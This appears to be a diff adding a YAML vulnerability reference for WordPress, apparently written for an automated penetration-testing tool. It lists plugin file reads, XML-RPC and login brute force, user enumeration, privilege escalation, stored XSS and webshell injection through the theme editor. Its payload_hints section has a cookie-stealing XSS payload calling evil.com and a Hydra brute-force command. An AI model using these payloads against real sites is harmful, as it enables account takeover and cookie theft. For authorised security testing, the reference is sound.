@@ -1,0 +1,109 @@
+tech_name: WordPress
+
+common_vulns:
+  - vuln_name: Unauthenticated Arbitrary File Read (XXE/Path Traversal via Plugins)
+    description: >
+      Many WordPress plugins process user-supplied file paths or XML without
+      sanitization. Plugin vulnerabilities are a primary attack surface.
+    indicators:
+      - "wp-content/plugins/"
+      - "include($file)"
+      - "file_get_contents($_GET"
+    test_idea: >
+      Enumerate installed plugins via /wp-content/plugins/. Test known CVEs using
+      WPScan. Try path traversal in plugin file parameters.
+
+  - vuln_name: XML-RPC Brute Force and Amplification
+    description: >
+      WordPress XML-RPC (/xmlrpc.php) supports multicall for authenticating
+      multiple credentials in a single request, enabling efficient brute force.
+    indicators:
+      - "/xmlrpc.php accessible"
+      - "system.multicall"
+    test_idea: >
+      Send a multicall request with hundreds of wp.getUsersBlogs method calls
+      using wordlist credentials to brute-force in bulk without triggering per-request limits.
+
+  - vuln_name: User Enumeration via Author Archive
+    description: >
+      WordPress author archive pages (?author=1, ?author=2) reveal usernames
+      of registered users, enabling targeted password attacks.
+    indicators:
+      - "/?author=1"
+      - "/author/"
+      - "X-Redirect-By: WordPress"
+    test_idea: >
+      Iterate /?author=1 through /?author=20. Record redirects to /author/<username>/
+      to enumerate all valid usernames. Cross-reference with WP JSON API /wp-json/wp/v2/users.
+
+  - vuln_name: REST API User Disclosure
+    description: >
+      The WP JSON REST API at /wp-json/wp/v2/users exposes usernames, display names,
+      and avatar URLs for all registered users by default.
+    indicators:
+      - "/wp-json/wp/v2/users"
+    test_idea: >
+      Request /wp-json/wp/v2/users. Parse response for slug (username), name, and id.
+      Use these for credential stuffing or targeted attacks.
+
+  - vuln_name: Privilege Escalation via Role Manipulation in User Meta
+    description: >
+      Plugins that expose user meta update endpoints without capability checks allow
+      adding administrator capabilities to any user.
+    indicators:
+      - "update_user_meta"
+      - "add_user_to_blog"
+      - "wp_capabilities"
+    test_idea: >
+      Identify endpoints calling update_user_meta with user-controlled capability keys.
+      Submit wp_capabilities={administrator:true} via AJAX/REST.
+
+  - vuln_name: Stored XSS via Comment/Post Content
+    description: >
+      Unescaped output of user-controlled content in theme templates or plugin
+      shortcodes allows stored XSS without authentication (comments) or with
+      contributor role.
+    indicators:
+      - "echo $_POST['content']"
+      - "wp_kses absent"
+      - "the_content() without sanitization"
+    test_idea: >
+      Submit a comment or post containing <script>alert(1)</script> or SVG XSS payloads.
+      Verify if the payload executes when an admin moderates or views the content.
+
+  - vuln_name: Remote Code Execution via Theme/Plugin Editor
+    description: >
+      The built-in Theme and Plugin editors in wp-admin allow direct PHP file editing
+      if not disabled, enabling persistent RCE for any admin user.
+    indicators:
+      - "/wp-admin/theme-editor.php"
+      - "/wp-admin/plugin-editor.php"
+    test_idea: >
+      Access the theme editor and inject a PHP webshell in functions.php or a less
+      critical template file. Trigger via a theme function call.
+
+  - vuln_name: wp-login.php Brute Force
+    description: >
+      No built-in lockout mechanism on wp-login.php enables unlimited credential
+      stuffing attempts against WordPress administrator accounts.
+    indicators:
+      - "/wp-login.php"
+      - "log=admin&pwd="
+    test_idea: >
+      Use Hydra or WPScan's brute force with common credential lists against
+      /wp-login.php. Check for lockout behavior after failures.
+
+misconfigurations:
+  - xmlrpc.php not disabled
+  - wp-login.php not protected by IP allowlist or fail2ban
+  - WordPress version exposed in meta generator tag
+  - README.html and license.txt accessible revealing version
+  - File editing enabled in wp-admin (DISALLOW_FILE_EDIT not set)
+
+payload_hints:
+  user_enum: "/?author=1"
+  rest_users: "/wp-json/wp/v2/users"
+  xmlrpc_multicall: "<methodName>system.multicall</methodName>"
+  xss_comment: "<script>fetch('https://evil.com/'+btoa(document.cookie))</script>"
+  theme_editor: "/wp-admin/theme-editor.php"
+  brute_force: "hydra -L users.txt -P pass.txt target.com http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^:F=incorrect'"
